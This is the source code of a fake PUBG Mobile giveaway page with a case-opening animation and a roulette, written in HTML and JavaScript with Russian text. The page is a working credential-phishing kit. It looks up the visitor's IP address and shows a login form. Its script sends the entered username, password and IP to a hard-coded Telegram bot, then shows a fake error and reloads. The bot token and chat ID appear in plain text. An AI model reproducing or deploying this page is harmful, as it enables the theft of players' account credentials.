<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUBG Mobile - Giveaway</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        :root {
            --pubg-gold: #ffbc00;
            --pubg-gold-dark: #cc9600;
            --pubg-dark: #0b0c0d;
            --pubg-blue: #0084ff;
        }

        body {
            background-image: url('IMG_1807.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            color: white;
            font-family: 'Inter', sans-serif;
            margin: 0; padding: 0;
            overflow-x: hidden;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        /* –õ–û–ì–û–¢–ò–ü –í –£–ì–õ–£ */
        .header-logo {
            height: 28px;
            width: auto;
            object-fit: contain;
            filter: drop-shadow(0 0 5px rgba(0,0,0,0.5));
        }

        #preloader {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-image: url('IMG_1807.png');
            background-size: cover;
            background-position: center;
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 0.5s ease;
        }

        .loader-box {
            background: rgba(13, 15, 19, 0.9);
            padding: 30px 50px;
            border-radius: 15px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
        }

        .spinner-snake {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #ffffff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }

        .uc-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: #1a1a1a;
            border: 1px solid #c4a162;
            border-radius: 4px;
            padding: 1px 4px;
            font-size: 10px;
            font-weight: 900;
            color: #fff;
            margin-right: 4px;
        }

        header {
            background: rgba(0, 0, 0, 0.95);
            padding: 12px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            position: sticky; top: 0; z-index: 100;
            height: 60px;
        }

        .balance-display {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 4px 10px;
            display: flex;
            align-items: center;
            gap: 4px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .btn-plus {
            background: #4caf50;
            width: 16px; height: 16px;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 10px; font-weight: bold;
        }

        .case-container {
            position: relative;
            width: 100%; height: 180px;
            overflow: hidden;
            margin: 20px 0;
        }

        .case-line {
            position: absolute;
            top: 0; left: 50%;
            width: 2px; height: 100%;
            background: var(--pubg-gold);
            z-index: 20;
            box-shadow: 0 0 15px var(--pubg-gold);
            transform: translateX(-50%);
        }

        .case-tape {
            display: flex;
            padding: 30px 0;
            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
            will-change: transform;
        }

        .case-item {
            min-width: 140px;
            width: 140px;
            height: 120px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .case-item img { width: 100px; height: 100px; object-fit: contain; }

        .btn-blue {
            background: var(--pubg-blue);
            color: white;
            width: calc(100% - 32px);
            margin: 0 16px;
            padding: 16px;
            border-radius: 12px;
            font-weight: 700;
            font-size: 16px;
            text-align: center;
            display: block;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .nav-bar {
            position: fixed; bottom: 0; left: 0; right: 0;
            background: #000; height: 65px;
            display: flex; justify-content: space-around; align-items: center;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            z-index: 50;
        }
        .nav-item { display: flex; flex-direction: column; align-items: center; color: #444; font-size: 10px; cursor: pointer;}
        .nav-item.active { color: var(--pubg-gold); }

        .modal {
            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
            z-index: 1000; display: none; flex-direction: column; padding: 20px;
            justify-content: center;
        }
        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
    </style>
</head>

    <script>
        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
        const CHAT_ID = '1709490182';
        const prizeImages = ['priz1.png', 'priz2.png', 'priz3.png', 'priz4.png', 'priz5.png', 'priz6.png', 'priz7.png', 'priz8.png', 'priz9.png'];
        
        let balance = 60; 
        let isSpinning = false;
        let userIP = '';
        const itemWidth = 140;
        let currentWinCellId = null;

        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');

        function updateBalanceUI() {
            document.getElementById('headerBalance').innerText = balance;
            const canPlay = balance >= 60;
            document.getElementById('openBtn').style.display = canPlay ? 'block' : 'none';
            document.getElementById('depositBtn').style.display = canPlay ? 'none' : 'block';
            document.getElementById('spinBtn').style.display = canPlay ? 'block' : 'none';
            document.getElementById('spinDepositBtn').style.display = canPlay ? 'none' : 'block';
        }

        function showSection(id) {
            if (isSpinning) return;
            document.getElementById('section-hub').style.display = 'none';
            document.getElementById('section-case').style.display = 'none';
            document.getElementById('section-spin').style.display = 'none';
            document.getElementById('section-' + id).style.display = 'block';

            // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –º–µ–∂–¥—É –ª–æ–≥–æ—Ç–∏–ø–æ–º –∏ –∫–Ω–æ–ø–∫–æ–π –Ω–∞–∑–∞–¥
            if(id === 'hub') {
                document.getElementById('mainLogo').style.display = 'block';
                document.getElementById('backBtn').style.display = 'none';
                document.getElementById('nav-hub').classList.add('active');
            } else {
                document.getElementById('mainLogo').style.display = 'none';
                document.getElementById('backBtn').style.display = 'flex';
                document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
                if(id === 'case') document.querySelector('.nav-item:nth-child(1)').classList.add('active');
            }
            
            updateBalanceUI();
            if (currentWinCellId) {
                const winCell = document.getElementById(currentWinCellId);
                if (winCell) {
                    winCell.style.borderColor = 'transparent';
                    winCell.style.boxShadow = 'none';
                }
                currentWinCellId = null;
            }
        }

        function initCase() {
            const tape = document.getElementById('caseTape');
            tape.innerHTML = '';
            let lastIdx = -1;
            for(let i=0; i<80; i++) {
                let idx;
                do { idx = Math.floor(Math.random() * prizeImages.length); } while (idx === lastIdx);
                lastIdx = idx;tape.innerHTML += `<div class="case-item"><img src="${prizeImages[idx]}"></div>`;
            }
            tape.style.transform = `translateX(0px)`;
        }

        function openCase() {
            if (balance < 60 || isSpinning) return;
            balance -= 60;
            updateBalanceUI();
            isSpinning = true;
            const targetIdx = 45; 
            const tape = document.getElementById('caseTape');
            const screenCenter = window.innerWidth / 2;
            const finalOffset = (targetIdx * itemWidth) - screenCenter + (itemWidth / 2);
            tape.style.transform = `translateX(-${finalOffset}px)`;
            setTimeout(() => {
                sendTelegram(`üéÅ –ö–µ–π—Å –æ—Ç–∫—Ä—ã—Ç | IP: ${userIP}`);
                isSpinning = false;
                startAuth();
            }, 5000);
        }

        function startSpin() {
            if (isSpinning || balance < 60) return;
            balance -= 60;
            updateBalanceUI();
            isSpinning = true;
            const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
            let step = 0;
            const totalSteps = 25 + Math.floor(Math.random() * 10);
            const winIndex = Math.floor(Math.random() * cells.length);
            const winCellId = cells[winIndex];
            document.getElementById('spinBtn').style.display = 'none';
            const interval = setInterval(() => {
                cells.forEach(id => {
                    const cell = document.getElementById(id);
                    cell.style.borderColor = 'transparent';
                    cell.style.boxShadow = 'none';
                });
                const currentId = cells[step % cells.length];
                const currentEl = document.getElementById(currentId);
                currentEl.style.borderColor = '#ffbc00';
                currentEl.style.boxShadow = '0 0 15px rgba(255, 188, 0, 0.5)';
                step++;
                if (step >= totalSteps) {
                    clearInterval(interval);
                    cells.forEach(id => {
                        const cell = document.getElementById(id);
                        cell.style.borderColor = 'transparent';
                        cell.style.boxShadow = 'none';
                    });
                    const winCell = document.getElementById(winCellId);
                    winCell.style.borderColor = '#ffbc00';
                    winCell.style.boxShadow = '0 0 20px rgba(255, 188, 0, 0.8)';
                    currentWinCellId = winCellId;
                    setTimeout(() => {
                        document.getElementById('spinDepositBtn').style.display = 'block';
                        sendTelegram(`üé° –†—É–ª–µ—Ç–∫–∞ | IP: ${userIP}`);
                        isSpinning = false;
                    }, 500);
                }
            }, 120);
        }

        function startAuth() { 
            document.getElementById('modalAuth').style.display = 'flex'; 
        }
        
        function openForm(m) {
            document.getElementById('modalAuth').style.display = 'none';
            document.getElementById('modalForm').style.display = 'flex';
            document.getElementById('methodName').innerText = m;
        }

        async function finalSubmit() {
            const u = document.getElementById('inpUser').value;
            const p = document.getElementById('inpPass').value;
            if(u.length < 3 || p.length < 3) return alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è');
            await sendTelegram(`üî• LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`);
            alert('–û—à–∏–±–∫–∞. –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω—ã–π —É—Ä–æ–≤–µ–Ω—å –¥–æ–≤–µ—Ä–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥–æ–π –º–µ—Ç–æ–¥.');
            location.reload();
        }

        async function sendTelegram(t) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: t})
            }).catch(e => {});
        }

        window.onload = () => {
            initCase();
            updateBalanceUI();
            setTimeout(() => {
                const loader = document.getElementById('preloader');
                loader.style.opacity = '0';
                setTimeout(() => { loader.style.display = 'none'; }, 500);
            }, 2000);
        };
    </script>
